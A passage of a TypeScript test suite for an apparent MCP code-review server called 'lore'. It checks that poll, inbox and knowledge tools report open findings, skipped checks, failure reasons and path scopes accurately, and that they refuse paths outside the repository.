    // Every conditional field must actually be EMITTED here, or the reverse check
    // below silently proves nothing about the ones that are absent.
    const t0 = store.openTierRun("rev1", "t0", 1, new Date().toISOString());
    store.closeTierRun(t0, "findings", ["eslint: not configured in this repo"]);

    const out = await callTool("review_poll", { review_id: "rev1" });
    const byFp = Object.fromEntries(
      (out["new_findings"] as Record<string, unknown>[]).map((f) => [f["fingerprint"], f]),
    );

    // Delivered, because it is new to this caller — silence would be the opposite
    // failure, and this codebase resolves ambiguity toward saying more.
    expect(Object.keys(byFp).sort()).toStrictEqual(["l1", "m1"]);

    expect(byFp["m1"]?.["justify_with"]).toBeUndefined();
    expect(byFp["m1"]?.["settled"]).toBe("justified-accepted");
    expect(byFp["m1"]?.["settled_because"]).toContain("carried forward");

    // The unsettled one is untouched: it still says how to answer it.
    expect(byFp["l1"]?.["settled"]).toBeUndefined();
    expect(byFp["l1"]?.["justify_with"]).toContain("lore-ok[l1]");

    // And it is not counted as work.
    expect(out["open_count"]).toBe(1);
  });

  // The docs ARE the interface (spec/agent-docs.md §1), so the fields TOOL_DOCS.poll
  // names have to be the fields the server emits. This is the mechanical half.
  //
  // It exists because the per-finding shape was undocumented for its whole life:
  // `justify_with` had never been mentioned in any client-facing text, and when
  // `settled` and `justification_rejected` were added a client following the docs
  // literally would have gone on treating a closed finding as work.
  it("emits exactly the per-finding fields the docs promise", async () => {
    store.recordVerdict("rev1", {
      fingerprint: "m1", verdict: "justified-accepted", rationale: "bounded upstream",
      scope: undefined, tier: "t1", round: 1,
    });
    // Every conditional field must actually be EMITTED here, or the reverse check
    // below silently proves nothing about the ones that are absent.
    const t0 = store.openTierRun("rev1", "t0", 1, new Date().toISOString());
    store.closeTierRun(t0, "findings", ["eslint: not configured in this repo"]);

    const out = await callTool("review_poll", { review_id: "rev1" });
    const byFp = Object.fromEntries(
      (out["new_findings"] as Record<string, unknown>[]).map((f) => [f["fingerprint"], f]),
    );

    // Every field named in the docs must exist on the shape it describes...
    const documented = TOOL_DOCS.poll;
    // Always present on every finding.
    for (const field of ["fingerprint", "file", "line", "symbol", "severity", "claim", "evidence", "failure_scenario"]) {
      expect(documented, `TOOL_DOCS.poll does not mention ${field}`).toContain(field);
      expect(byFp["l1"], `poll does not emit ${field}`).toHaveProperty(field);
    }
    // Conditional: named in the docs, emitted only when they apply.
    for (const field of ["cwe", "history", "justify_with", "settled", "settled_because", "justification_rejected", "open_count", "checks_skipped"]) {
      expect(documented, `TOOL_DOCS.poll does not mention ${field}`).toContain(field);
    }

    // The OTHER direction, and the one that actually catches drift. The list above
    // is an allow-list: it proves the docs mention what we remembered to add to it,
    // and says nothing about a field shipped without being written down.
    // `checks_skipped_note` was emitted for exactly that reason and no test noticed.
    const emitted = new Set([
      ...Object.keys(out),
      ...(out["new_findings"] as Record<string, unknown>[]).flatMap((f) => Object.keys(f)),
    ]);
    // Envelope fields a client gets from the protocol, not from these docs.
    const NOT_DOCUMENTED_HERE = new Set(["review_id", "state", "clean", "note", "new_findings", "line", "symbol"]);
    const undocumented = [...emitted].filter((k) => !NOT_DOCUMENTED_HERE.has(k) && !documented.includes(k));
    expect(undocumented, "poll emits fields TOOL_DOCS.poll never mentions").toStrictEqual([]);

    // ...and the three shapes are mutually exclusive, which is what the docs claim.
    expect(byFp["l1"]).toHaveProperty("justify_with");
    expect(byFp["l1"]).not.toHaveProperty("settled");
    expect(byFp["m1"]).toHaveProperty("settled");
    expect(byFp["m1"]).not.toHaveProperty("justify_with");
  });

  // INV-1 on the product surface. T0's deterministic engines go missing quietly —
  // no node_modules, no test script, a suite disabled for the deployment — and their
  // absence was reported to the model prompt and to the CLI, but never to the MCP
  // client. Reviewing a real PR made that concrete: tsc and eslint could not run for
  // want of an install, and nothing a client could read said so.
  it("tells the client which checks did not run", async () => {
    const id = store.openTierRun("rev1", "t0", 1, new Date().toISOString());
    store.closeTierRun(id, "findings", ["tsc: no installed dependencies", "tests: disabled for this deployment"]);

    const out = await callTool("review_poll", { review_id: "rev1" });
    expect(out["checks_skipped"]).toStrictEqual([
      "tsc: no installed dependencies",
      "tests: disabled for this deployment",
    ]);
    expect(String(out["checks_skipped_note"])).toMatch(/did NOT run/);
  });

  // Absent, not empty: a client must not have to distinguish [] from "all ran".
  it("says nothing when every check ran", async () => {
    const id = store.openTierRun("rev1", "t0", 1, new Date().toISOString());
    store.closeTierRun(id, "clean");
    const out = await callTool("review_poll", { review_id: "rev1" });
    expect(out).not.toHaveProperty("checks_skipped");
  });

  // c1a9d4b6/fcf8e8cd, found by lore's own review: a suppression notice quotes a
  // TEAM-authored development rule's full statement verbatim (D-83's design — "the
  // client's channel is the audit trail and wants the whole reason", review.ts) —
  // but every checks_skipped entry was blanket-mapped through forClient, built for
  // SYSTEM vocabulary. A rule whose statement happens to contain a URL or the word
  // "opencode" got rewritten before the client ever saw it: a quote attributed to
  // the team that the team never actually wrote. A genuinely system-authored entry
  // in the SAME list must still translate, so this checks the fix is selective, not
  // a second blanket skip in the other direction.
  it("quotes a team-authored suppression notice verbatim, but still translates a system one beside it", async () => {
    const id = store.openTierRun("rev1", "t0", 1, new Date().toISOString());
    store.closeTierRun(id, "findings", [
      "eslint was NOT reported at third_party/sdk.ts — t1 accepted an appeal to this project's development " +
        'rule ab12cd34 ("the vendored opencode SDK under third_party is upstream\'s, not ours to lint — ' +
        'tracked at https://github.com/org/sdk/issues/12") on 2026-08-20. Anything that rule would have ' +
        "caught here is unexamined; retire the rule to switch it back on.",
      "could not reach opencode at http://127.0.0.1:4000",
    ]);

    const out = await callTool("review_poll", { review_id: "rev1" });
    const skipped = out["checks_skipped"] as string[];
    expect(skipped[0], "the team's own words must survive, URL and all").toContain(
      "https://github.com/org/sdk/issues/12",
    );
    expect(skipped[0], "must not rewrite a quote the team wrote").toContain("opencode SDK");
    expect(skipped[1], "a genuinely system-authored entry must still translate").toBe(
      "lore's model runtime was unreachable",
    );
  });

  // The case the test above did not cover, and t2 said so: a verdict EXISTS but
  // does not close anything. `justified-rejected` means the reviewer read the
  // reason and refused it, which leaves the finding open and makes it worse than
  // one nobody argued about — lore's own rule is that a wrong justification is
  // worse than a bug, because it was trusted.
  //
  // Asking "is there a verdict row" instead of "is it closed" labelled exactly
  // that case "Already settled — nothing to do", dropped its justify_with, and
  // left open_count still counting it. A client trusting the per-finding note
  // over the aggregate would merge a defect its reviewer had explicitly refused.
  it("says a rejected justification is still open, and says it was rejected", async () => {
    store.recordVerdict("rev1", {
      fingerprint: "m1",
      verdict: "justified-rejected",
      rationale: "the caller's schema check does not run on this path",
      scope: undefined,
      tier: "t1",
      round: 1,
    });

    const out = await callTool("review_poll", { review_id: "rev1" });
    const m1 = (out["new_findings"] as Record<string, unknown>[]).find((f) => f["fingerprint"] === "m1");

    expect(m1?.["settled"]).toBeUndefined();
    expect(m1?.["justify_with"]).toContain("lore-ok[m1]");
    expect(m1?.["justification_rejected"]).toContain("schema check does not run");
    expect(String(m1?.["note"])).toMatch(/REJECTED/);

    // The aggregate and the per-finding label now agree — which is the whole point.
    expect(out["open_count"]).toBe(2);
  });
});

/**
 * THE INBOX MUST LIST A REVIEW THAT IS WAITING ON THE CLIENT AND HAS NOTHING FRESH.
 *
 * Its filter was `new_findings > 0 || needs_human`, so a review in `findings_ready`
 * whose findings had already been collected vanished from the one call whose stated job
 * is "what is waiting for me". That is not an exotic path — it is what happens every
 * time a session polls, starts fixing, and ends: the deltas are consumed, the review is
 * parked, and the next session is told it has nothing.
 *
 * Found on lore's own repository. rev_uFMG9 sat in `findings_ready` for two days,
 * absent from the inbox, holding a pinned worktree, hours from being swept as
 * `expired` — which by INV-1 never means "found nothing" and here would have meant
 * nothing at all.
 */
describe("the inbox lists what is waiting, not only what is fresh", () => {
  const open = (id: string, state: ReviewState, branch: string) =>
    store.createReview({
      id, repoId, principal: "alice", branch, intoRef: "main",
      ticket: "t", type: "code-arch", state, ladder: initialState(),
    });

  /**
   * A SUBMIT DURING A RUNNING ROUND IS HELD, NOT REFUSED (D-107). The client is told
   * plainly, nothing is applied yet, and the diff waits in the store for the reviewer's
   * next emission — the refusal-and-resubmit choreography this replaces was the part
   * the client paid for.
   */
  it("holds a submit that lands while a round is running", async () => {
    open("revHold", "running", "feat/mid-round");
    store.enqueue("revHold", "fast");

    const out = await callTool("review_submit", {
      review_id: "revHold",
      diff: "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b",
      tree_hash: "a".repeat(40),
    });

    expect(String(out["status"])).toBe("held");
    expect(String(out["note"])).toContain("do not need to resubmit");
    expect(store.heldDiffs("revHold")).toHaveLength(1);
    expect(store.getReview("revHold", "alice")?.state, "nothing applied, nothing changed").toBe("running");
  });

  /** Streamed findings are collectable mid-run, and the note says to start fixing (D-107). */
  it("delivers findings and says start-fixing while the tier still reads", async () => {
    open("revLive", "running", "feat/streaming");
    store.enqueue("revLive", "fast");
    store.recordFinding("revLive", {
      fingerprint: "s1", file: "a.ts", line: 3, symbol: "f", severity: "high",
      claim: "streamed mid-run", evidence: "e", failureScenario: "x", origin: "t1", round: 1,
      firstSeen: new Date().toISOString(),
    });

    const out = await callTool("review_poll", { review_id: "revLive" });
    expect(out["state"]).toBe("running");
    const got = (out["new_findings"] as unknown[]) ?? [];
    expect(got.length, "the finding is handed over before the round ends").toBe(1);
    expect(String(out["note"])).toContain("start fixing now");
  });

  /** The kitchen stays in the kitchen AT THE WIRE, not only in the helper (D-65 revised). */
  it("translates a recorded failure into contract language on poll", async () => {
    open("revKitchen", "failed", "feat/kitchen");
    store.setFailureReason(
      "revKitchen",
      "tier t3 (openai/gpt-5.6-terra) failed: opencode ran past 2700s without finishing",
    );

    const out = await callTool("review_poll", { review_id: "revKitchen" });
    expect(String(out["failed_because"])).toBe(
      "tier t3 failed: the reviewing model did not finish within its 2700s limit",
    );
  });

  it("lists a parked review whose findings were already collected", async () => {
    open("revP", "findings_ready", "feat/parked");
    store.recordFinding("revP", {
      fingerprint: "p1", file: "a.ts", line: 1, symbol: "s", severity: "high",
      claim: "c", evidence: "e", failureScenario: "f", origin: "t1", round: 1,
      firstSeen: "2026-08-03T00:00:00.000Z",
    });
    // The session that consumed them, and then ended.
    await callTool("review_poll", { review_id: "revP" });

    const out = await callTool("review_inbox", {});
    const rows = out["reviews"] as Record<string, unknown>[];
    const p = rows.find((r) => r["review_id"] === "revP");

    expect(p, "a parked review must not vanish because its findings were collected").toBeDefined();
    expect(p?.["new_findings"], "and it is honest that there is nothing new to collect").toBe(0);
    expect(p?.["waiting_on"]).toBe("you");
  });

  /**
   * THE ROW CAP MUST NOT UNDO THE FILTER. `listReviews` takes 50 rows and the inbox
   * filters them afterwards, so ordered by recency alone a wall of freshly-finished
   * reviews fills the result and the parked one never reaches the filter — invisible
   * until it expires, which is exactly the abandonment D-95 exists to end, reintroduced
   * by a LIMIT. Raised by lore's own t2 against the change that added the filter.
   */
  it("finds a parked review behind fifty more recent finished ones", async () => {
    open("revParked", "findings_ready", "feat/parked");
    store.db.prepare("UPDATE review SET updated_at = ? WHERE id = 'revParked'")
      .run(new Date(Date.now() - 86_400_000).toISOString());
    // Fifty terminal reviews, every one of them touched more recently than the parked one.
    for (let i = 0; i < 50; i++) open(`revDone${i}`, "passed", `feat/done-${i}`);

    const out = await callTool("review_inbox", {});
    const rows = out["reviews"] as Record<string, unknown>[];
    expect(rows.map((r) => r["review_id"]), "the one review that needs a person").toContain("revParked");
  });

  // The other half of the triage, and the reason to list a review with nothing to do:
  // a resumed session that cannot see its own running review starts a second one, and
  // `review_start` throws away every justification the first has already ratified.
  it("lists a running review as lore's move, not the client's", async () => {
    open("revR", "running", "feat/running");

    const out = await callTool("review_inbox", {});
    const r = (out["reviews"] as Record<string, unknown>[]).find((x) => x["review_id"] === "revR");

    expect(r, "a running review is still one of mine").toBeDefined();
    expect(r?.["waiting_on"]).toBe("lore");
    expect(r?.["new_findings"]).toBe(0);
  });

  // A deadline is what makes "waiting on you" actionable. It has to be the SAME 48
  // hours the sweep uses, so both read one constant.
  it("says when the review actually stops accepting an answer, counted from when it last moved", async () => {
    open("revX", "findings_ready", "feat/expiring");
    const row = store.getReview("revX", "alice");

    const out = await callTool("review_inbox", {});
    const x = (out["reviews"] as Record<string, unknown>[]).find((r) => r["review_id"] === "revX");

    // A findings_ready review is not TAKEN at 48h any more — it dims to findings_stale
    // and lives a further week (D-106). The deadline a client can plan around is the
    // moment the review stops accepting a submit, which is the sum of both clocks.
    expect(x?.["expires_at"]).toBe(
      new Date(
        Date.parse(row?.updatedAt ?? "") + STALE_HOURS * 3_600_000 + STALE_GRACE_DAYS * 86_400_000,
      ).toISOString(),
    );
  });

  it("gives a dimmed review the week it has left, not the 48h it already spent", async () => {
    open("revG", "findings_stale", "feat/gray");
    const row = store.getReview("revG", "alice");

    const out = await callTool("review_inbox", {});
    const g = (out["reviews"] as Record<string, unknown>[]).find((r) => r["review_id"] === "revG");

    expect(g?.["waiting_on"], "gray still waits on the client").toBe("you");
    expect(g?.["expires_at"]).toBe(
      new Date(Date.parse(row?.updatedAt ?? "") + STALE_GRACE_DAYS * 86_400_000).toISOString(),
    );
  });

  // A finished review is not waiting for anybody, and a deadline on one would be
  // fiction: `expireStaleReviews` does not touch terminal states.
  it("drops a finished review once its findings have been taken", async () => {
    open("revD", "cancelled", "feat/done");
    store.recordFinding("revD", {
      fingerprint: "d1", file: "a.ts", line: 1, symbol: "s", severity: "low",
      claim: "c", evidence: "e", failureScenario: "f", origin: "t1", round: 1,
      firstSeen: "2026-08-03T00:00:00.000Z",
    });

    // While it still holds findings it is listed — cancelling hands them over and they
    // are real, so losing them here would be a regression of its own.
    const before = await callTool("review_inbox", {});
    const d = (before["reviews"] as Record<string, unknown>[]).find((r) => r["review_id"] === "revD");
    expect(d, "a cancelled review's undelivered findings are still waiting").toBeDefined();
    expect(d, "but nothing will expire, so there is no deadline to state").not.toHaveProperty("expires_at");
    expect(d?.["waiting_on"]).toBe("you");

    await callTool("review_poll", { review_id: "revD" });
    const after = await callTool("review_inbox", {});
    expect(
      (after["reviews"] as Record<string, unknown>[]).find((r) => r["review_id"] === "revD"),
      "once collected there is nothing to come back to",
    ).toBeUndefined();
  });

  // The docs ARE the interface, so a field the inbox emits and TOOL_DOCS.inbox never
  // mentions is a client acting on a contract it cannot read (spec/agent-docs.md §1).
  it("emits no inbox field the docs do not name", async () => {
    open("revF", "findings_ready", "feat/fields");
    const out = await callTool("review_inbox", {});
    const emitted = new Set(
      (out["reviews"] as Record<string, unknown>[]).flatMap((r) => Object.keys(r)),
    );
    // Named by the protocol or by every other tool, not by this text.
    const ELSEWHERE = new Set(["review_id", "branch", "state", "clean", "findings", "highest"]);
    const undocumented = [...emitted].filter((k) => !ELSEWHERE.has(k) && !TOOL_DOCS.inbox.includes(k));
    expect(undocumented, "the inbox emits fields its own docs never mention").toStrictEqual([]);
  });
});

// INV-1 has a hole if "did not run" cannot say WHY.
//
// A client polled a failed review, saw `{"state":"failed", ...}` and nothing else,
// and published that its repository was not registered with lore — when the
// repository WAS registered, WAS mirrored, and had just authenticated with its own
// token to create that very review. The real reason was a stale mirror, and the
// message naming the fix (`make mirror`) was already written, one table away in
// job.last_error, unreachable through the MCP surface.
//
// A bare `failed` does not merely withhold information. It invites a diagnosis, and
// the client's was the opposite of the truth.
// The fact a landing decision turns on, and it was reaching only the reviewer.
//
// A client triaging eight open pull requests asked which were landable. lore knew —
// deterministically, in milliseconds — that one was 22 commits behind, and told
// nobody but the model. The client computed it itself with `gh` and `git`, and the
// model, having no true fact to name, invented a bundled refactor instead.
describe("the client is told how far the base has moved", () => {
  beforeEach(() => {
    store.createReview({
      id: "revB", repoId, principal: "alice", branch: "feat/x", intoRef: "main",
      ticket: "t", type: "code-arch", state: "findings_ready", ladder: initialState(),
    });
  });

  it("reports behind_by, and says what it costs the result", async () => {
    store.setBehindBy("revB", 22);
    const out = await callTool("review_poll", { review_id: "revB" });
    expect(out["behind_by"]).toBe(22);
    expect(String(out["behind_by_note"])).toMatch(/does not mean this merges cleanly/);
  });

  // Absent rather than zero: a current branch should say nothing at all.
  it("says nothing when the branch is current", async () => {
    store.setBehindBy("revB", 0);
    const out = await callTool("review_poll", { review_id: "revB" });
    expect(out).not.toHaveProperty("behind_by");
  });
});

describe("a failed review says why", () => {
  beforeEach(() => {
    store.createReview({
      id: "revF", repoId, principal: "alice", branch: "feat/x", intoRef: "main",
      ticket: "t", type: "code-arch", state: "failed", ladder: initialState(),
    });
    store.createReview({
      id: "revOK", repoId, principal: "alice", branch: "feat/y", intoRef: "main",
      ticket: "t", type: "code-arch", state: "findings_ready", ladder: initialState(),
    });
  });

  it("carries the recorded reason", async () => {
    // In the order it actually happens: the review is running, its job fails, and the
    // review becomes `failed` as a consequence.
    //
    // This used to create the review already `failed` and then claim a job for it,
    // which `claimJob` now refuses — a terminal review never gets another round. The
    // fixture described a sequence that cannot occur, so it broke the moment the rule
    // was enforced, and `job` came back undefined while `finishJob(0, …)` silently
    // wrote nothing.
    store.updateReview("revF", { state: "running" });
    store.enqueue("revF", "fast");
    const job = store.claimJob();
    expect(job, "the fixture must actually claim a job, or it tests nothing").toBeDefined();
    store.finishJob(job?.id ?? 0, "failed", "the clone was last fetched 43 minutes ago — run `make mirror`");
    store.updateReview("revF", { state: "failed" });

    const out = await callTool("review_poll", { review_id: "revF" });
    expect(out["state"]).toBe("failed");
    expect(String(out["failed_because"])).toContain("make mirror");
  });

  // Missing reason is itself a defect, and must not read as "no cause".
  it("says so when no reason was recorded, rather than staying silent", async () => {
    const out = await callTool("review_poll", { review_id: "revF" });
    expect(String(out["failed_because"])).toMatch(/no reason was recorded/);
  });

  it("says nothing about failure on a review that has not failed", async () => {
    const out = await callTool("review_poll", { review_id: "revOK" });
    expect(out).not.toHaveProperty("failed_because");
  });
});

// `count: 0` was the first thing a new client ever saw, and it read it correctly and
// concluded the wrong thing: "the knowledge store is empty" went into two manuals.
//
// The zero was true. Bootstrapping needs a mirror to read, so it happens on the first
// review (D-35) — not at provisioning. Nothing said so, and this is the very first
// question a new workgroup asks about the thing whose entire pitch is memory.
describe("an empty knowledge base explains itself", () => {
  it("says NOT YET rather than letting a zero speak for itself", async () => {
    const out = await callTool("knowledge_query", {});
    expect(out["count"]).toBe(0);
    expect(String(out["note"])).toMatch(/YET/);
    // The two things that actually resolve it, named rather than implied.
    expect(String(out["note"])).toMatch(/FIRST REVIEW/);
    expect(String(out["note"])).toContain("knowledge_teach");
  });

  // A filter matching nothing is a different fact from a repository knowing nothing,
  // and conflating them would teach the same wrong conclusion by another route.
  it("distinguishes a filter that matched nothing from a repo that knows nothing", async () => {
    store.addKnowledge({
      repoId, kind: "rule", source: "taught",
      statement: "holds are idempotent on the network transaction id", why: "ADR-0026",
      path: undefined, cwe: undefined, provenance: undefined,
      sourceBlob: undefined, confidence: undefined,
    });

    const hit = await callTool("knowledge_query", {});
    expect(hit["count"]).toBe(1);
    expect(String(hit["note"])).not.toMatch(/YET/);

    const miss = await callTool("knowledge_query", { contains: "nothing matches this" });
    expect(miss["count"]).toBe(0);
    expect(String(miss["note"])).toMatch(/HAS knowledge/);
  });

  // Found by lore's own review (b9033841): the note blanket-framed every returned
  // row as "this team's decisions", including a bootstrap `kind: "fact"` row — a
  // model's own unconfirmed reading of one branch's code — through the exact
  // surface TOOL_DOCS.query tells a client to trust before writing code. The same
  // laundering 70b88761/652bb58d closed in the reviewer prompt and finding history.
  it("does not present a bootstrap fact as a team decision in the note", async () => {
    store.addKnowledge({
      repoId, kind: "fact", source: "derived",
      statement: "this module is invoked only by the scheduler", why: undefined,
      path: "src/scheduler", cwe: undefined, provenance: "bootstrap:src/scheduler/invoker.ts",
      sourceBlob: undefined, confidence: 0.5,
    });

    const out = await callTool("knowledge_query", {});
    expect(out["count"]).toBe(1);
    expect(String(out["note"]), "a fact must be flagged as unconfirmed, not folded into settled decisions").toMatch(
      /unconfirmed/,
    );
  });

  it("keeps the plain note when only rules are returned (control)", async () => {
    store.addKnowledge({
      repoId, kind: "rule", source: "taught",
      statement: "holds are idempotent on the network transaction id", why: "ADR-0026",
      path: undefined, cwe: undefined, provenance: undefined,
      sourceBlob: undefined, confidence: undefined,
    });

    const out = await callTool("knowledge_query", {});
    expect(String(out["note"])).toBe("Taught rules outrank inferred ones. These are this team's decisions, not suggestions.");
  });
});

// A REPOSITORY PAST 200 LIVE RULES READ AS THOUGH IT HAD STOPPED LEARNING.
//
// Found by lore's own review (562d4c2e, 0e9ae660) — the same LIMIT 200 default
// aa57c0f2 already fixed for the conflict-id `byId` maps in this file was still live
// here: `count` froze at 200 once a repo passed that many rules, and a `contains`
// match among the older ones silently fell out of the window. Worse than a bare
// zero: the empty-match note AFFIRMATIVELY said "This repository HAS knowledge;
// nothing matched this filter. Widen it before concluding anything" — false when the
// match exists beyond the window and no widening of the filter can reach it. This is
// exactly the surface knowledge_resolve's own refusal ("check knowledge_query")
// points a caller back to.
describe("knowledge_query does not lose rules past two hundred (562d4c2e, 0e9ae660)", () => {
  it("still finds a match older than the two hundred newest rules", async () => {
    store.addKnowledge({
      repoId, kind: "rule", source: "taught",
      statement: "the payroll cutover window closes at midnight UTC, not local time",
      why: "ADR-0041", path: undefined, cwe: undefined, provenance: undefined,
      sourceBlob: undefined, confidence: undefined,
    });
    for (let i = 0; i < 205; i++) {
      store.addKnowledge({
        repoId, kind: "rule", source: "ingested", statement: `newer rule ${i}`, why: undefined,
        path: undefined, cwe: undefined, provenance: `doc${i}.md`, sourceBlob: `b${i}`, confidence: 0.5,
      });
    }

    const out = await callTool("knowledge_query", { contains: "payroll cutover" });
    expect(out["count"], "the match must be found, not silently capped out of the window").toBe(1);
    expect(String(out["note"])).not.toMatch(/nothing matched/);
  });

  it("reports the true total past two hundred live rules, not a frozen cap", async () => {
    for (let i = 0; i < 205; i++) {
      store.addKnowledge({
        repoId, kind: "rule", source: "ingested", statement: `rule ${i}`, why: undefined,
        path: undefined, cwe: undefined, provenance: `doc${i}.md`, sourceBlob: `b${i}`, confidence: 0.5,
      });
    }
    const out = await callTool("knowledge_query", {});
    expect(out["count"]).toBe(205);
  });
});

// A TAUGHT RULE WITH A NATURAL DIRECTORY SPELLING SCOPED NOTHING, EVER.
//
// Found by lore's own review (28941e15, 88958ae6) — knowledge_teach stored `path`
// verbatim, but every consumer (`scopesOverlap` in conflict.ts, `knowledgeFor`'s SQL
// `LIKE path || '/%'`) matches at an EXACT segment boundary. "src/tests/" (a
// trailing slash) and "./src" (a leading dot-segment) are the natural ways to spell
// a directory, and both stored a rule that then matched no file, ever — recorded:
// true, confidence 1, silently inert. `normalizeReviewPath` already existed in this
// file for review_start's folder path; applied here too.
describe("knowledge_teach scopes a rule the same way however its path is spelled (28941e15, 88958ae6)", () => {
  it("matches a file under the directory when taught with a trailing slash", async () => {
    await callTool("knowledge_teach", {
      statement: "tests under here may bind to loopback",
      why: "sandboxed, no real network",
      path: "src/tests/",
    });
    const out = await callTool("knowledge_query", { path: "src/tests/foo.test.ts" });
    expect(out["count"], "a trailing slash on the taught path must not make the rule unmatchable").toBe(1);
  });

  it("matches a file under the directory when taught with a leading ./", async () => {
    await callTool("knowledge_teach", {
      statement: "generated code here is not hand-reviewed",
      why: "codegen output",
      path: "./src/generated",
    });
    const out = await callTool("knowledge_query", { path: "src/generated/schema.ts" });
    expect(out["count"], "a leading ./ on the taught path must not make the rule unmatchable").toBe(1);
  });

  it("keeps an already-canonical path untouched (control)", async () => {
    await callTool("knowledge_teach", {
      statement: "payroll math is fixed-point, never float",
      why: "ADR-0012",
      path: "src/payroll",
    });
    const out = await callTool("knowledge_query", { path: "src/payroll/calc.ts" });
    expect(out["count"]).toBe(1);
  });

  // Found by lore's own review (7e754395), against the fix just above — normalizing
  // alone does not carry the refusal review_start pairs it with (pathEscapesWorktree).
  // An absolute path survives normalizeReviewPath unchanged, so it would still have
  // stored recorded: true and scoped nothing, ever — every consumer compares against
  // an always-relative file path from a diff. Refused here the same way review_start
  // refuses it at its own door, rather than silently recording a rule that can never
  // fire — the realistic source is an agent trained by review_start's own
  // folder-path convention to think in absolute paths.
  it("refuses an absolute path rather than silently recording a rule that can never fire", async () => {
    const res = await mcp(
      {
        jsonrpc: "2.0", id: 1, method: "tools/call",
        params: {
          name: "knowledge_teach",
          arguments: { statement: "s", why: "w", path: "/home/agent/repo/src/tests" },
        },
      },
      token,
    );
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:")) ?? "";
    const rpc = JSON.parse(line.slice("data:".length)) as { result?: { content?: { text?: string }[]; isError?: boolean } };
    expect(rpc.result?.isError).toBe(true);
    expect(rpc.result?.content?.[0]?.text).toMatch(/must stay inside the repository/);

    const out = await callTool("knowledge_query", {});
    expect(out["count"], "the refused rule must not have been recorded at all").toBe(0);
  });

  it("refuses a path starting with .. the same way", async () => {
    const res = await mcp(
      {
        jsonrpc: "2.0", id: 1, method: "tools/call",
        params: { name: "knowledge_teach", arguments: { statement: "s", why: "w", path: "../shared" } },
      },
      token,
    );
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:")) ?? "";
    const rpc = JSON.parse(line.slice("data:".length)) as { result?: { content?: { text?: string }[]; isError?: boolean } };
    expect(rpc.result?.isError).toBe(true);
    expect(rpc.result?.content?.[0]?.text).toMatch(/must stay inside the repository/);
  });
});

// c5e38bc8/2a540515, found by lore's own review: the fixes just above normalized
// the WRITE side (knowledge_teach) so a rule taught with a natural spelling still
// matches a canonical query — but the READ side (knowledge_query) passed its own
// `path` straight to knowledgeFor unnormalized, so the SAME rule, taught at the
// canonical spelling, silently missed a query spelled "src/tests/" or "./src/tests"
// — not an error, just a lower count that reads as "nothing here" instead of "your
// spelling could never match".
describe("knowledge_query normalizes its own path the same way knowledge_teach does (c5e38bc8, 2a540515)", () => {
  const teach = () =>
    callTool("knowledge_teach", {
      statement: "tests under here may bind to loopback",
      why: "sandboxed, no real network",
      path: "src/tests",
    });

  it("finds a canonically taught rule when queried with a trailing slash", async () => {
    await teach();
    const out = await callTool("knowledge_query", { path: "src/tests/" });
    expect(out["count"], "a trailing slash on the QUERY path must not miss the rule").toBe(1);
  });

  it("finds a canonically taught rule when queried with a leading ./", async () => {
    await teach();
    const out = await callTool("knowledge_query", { path: "./src/tests" });
    expect(out["count"], "a leading ./ on the QUERY path must not miss the rule").toBe(1);
  });

  it("refuses an absolute query path rather than silently returning zero", async () => {
    await teach();
    const res = await mcp(
      {
        jsonrpc: "2.0", id: 1, method: "tools/call",
        params: { name: "knowledge_query", arguments: { path: "/home/agent/repo/src/tests" } },
      },
      token,
    );
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:")) ?? "";
    const rpc = JSON.parse(line.slice("data:".length)) as { result?: { content?: { text?: string }[]; isError?: boolean } };
    expect(rpc.result?.isError).toBe(true);
    expect(rpc.result?.content?.[0]?.text).toMatch(/must stay inside the repository/);
  });
});

// RESUMING A REVIEW THAT WILL ONLY PARK AGAIN IS NOT PROGRESS, and reporting it as
// progress is worse than not resuming. `needsHuman` is recomputed from
// `openConflicts(repoId)`, which is repo-wide: a parked review is blocked by EVERY open
// conflict in the repository, not by one it could name. So settling one of two bought
// each waiting review a paid round and parked it again at the end of it, while
// `resumed_reviews` said they were moving.
describe("settling one of several conflicts resumes nothing, and says so", () => {
  const parked = (id: string) => {
    store.createReview({
      id, repoId, principal: "alice", branch: `feat/${id}`, intoRef: "main",
      ticket: "t", type: "code-arch", state: "needs_human", ladder: initialState(),
    });
  };
  const rule = (statement: string) =>
    store.addKnowledge({
      repoId, kind: "rule", source: "taught", statement, why: "because",
      path: undefined, cwe: undefined, provenance: undefined,
      sourceBlob: undefined, confidence: undefined,
    }).id;

  it("holds the reviews while another conflict is open, and names how many", async () => {
    const [a, b, c, d] = [rule("holds expire"), rule("holds never expire"), rule("x is y"), rule("x is not y")];
    store.recordConflict(repoId, a as string, b as string);
    store.recordConflict(repoId, c as string, d as string);
    parked("revP");

    const out = await callTool("knowledge_resolve", { keep: a, retire: b, reason: "ADR-0026 says so" });
    expect(out["resolved"]).toBe(true);
    expect(out["resumed_reviews"]).toBe(0);
    expect(out["conflicts_still_open"]).toBe(1);
    expect(String(out["note"])).toContain("still open");
    // Still parked, and NOT charged for a round that would have re-parked it.
    expect(store.getReview("revP", "alice")?.state).toBe("needs_human");
  });

  it("resumes them when the last one is settled", async () => {
    const [a, b] = [rule("holds expire"), rule("holds never expire")];
    store.recordConflict(repoId, a as string, b as string);
    parked("revP");

    const out = await callTool("knowledge_resolve", { keep: a, retire: b, reason: "ADR-0026 says so" });
    expect(out["resumed_reviews"]).toBe(1);
    expect(out["conflicts_still_open"]).toBe(0);
    expect(store.getReview("revP", "alice")?.state).toBe("queued");
  });
});

// Found by lore's own review (55452eb0): the handler discarded escalateConflict's
// result and reported "Recorded" unconditionally — a wrong id pair, or one already
// escalated, wrote nothing while the client was told a person would be notified.
describe("knowledge_escalate refuses to claim success for a no-op", () => {
  /** The error path, which `callTool` cannot reach — it asserts there is no error. */
  const callRaw = async (name: string, args: Record<string, unknown>) => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } }, token);
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:")) ?? "";
    return JSON.parse(line.slice("data:".length)) as {
      result?: { content?: { text?: string }[]; isError?: boolean };
      error?: { message?: string };
    };
  };
  const message = (r: Awaited<ReturnType<typeof callRaw>>) =>
    `${r.error?.message ?? ""} ${r.result?.content?.[0]?.text ?? ""}`;

  it("refuses rather than report 'Recorded' when the ids name no open conflict", async () => {
    const a = store.addKnowledge({
      repoId, kind: "rule", source: "taught", statement: "holds expire", why: undefined,
